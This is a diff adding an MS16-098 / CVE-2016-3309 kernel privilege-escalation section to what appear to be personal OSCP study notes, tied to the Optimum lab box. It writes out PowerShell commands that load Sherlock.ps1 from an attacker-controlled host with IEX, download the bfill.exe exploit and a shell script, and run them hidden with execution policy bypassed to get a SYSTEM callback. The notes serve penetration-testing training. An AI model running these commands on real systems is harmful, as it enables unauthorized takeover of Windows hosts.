@@ -788,6 +788,34 @@ Key old-OS exploits:
 
 See [[17. Windows Privilege Escalation|WPE.23]], [[17. Windows Privilege Escalation|WPE.24]].
 
+## MS16-098 / CVE-2016-3309: RGNOBJ integer overflow
+
+Use this historical route only after `systeminfo` confirms a matching Windows build, architecture, patch state, and processor count. Sherlock is a triage tool. Its MS16-032 result can be misleading on a one-processor system because the exploit checks the CPU count and exits.
+
+```powershell
+systeminfo
+
+IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/Sherlock.ps1')
+
+Find-AllVulns
+```
+
+From a clean native callback shell, download the reviewed `bfill.exe` binary and run it with a command that proves the new identity. Use a fresh listener for the elevated callback.
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/bfill.exe', 'C:\Users\$Username\Desktop\bfill.exe')
+
+(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/system-shell.ps1', 'C:\Users\$Username\Desktop\system-shell.ps1')
+
+C:\Users\$Username\Desktop\bfill.exe cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Users\$Username\Desktop\system-shell.ps1
+
+whoami
+```
+
+`bfill.exe` is the compiled proof used for the MS16-098 RGNOBJ elevation-of-privilege path. Run it from the returned user shell rather than from the HFS web-worker context. See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]].
+
+#### Tags: #MS16098 #CVE20163309 #RGNOBJ #Sherlock #WindowsKernelExploit #OneProcessorGotcha
+
 #### Tags: #Sherlock #WindowsExploitSuggester #OldOS #MS10092 #MS16032 #WindowsPrivesc
 
 ---
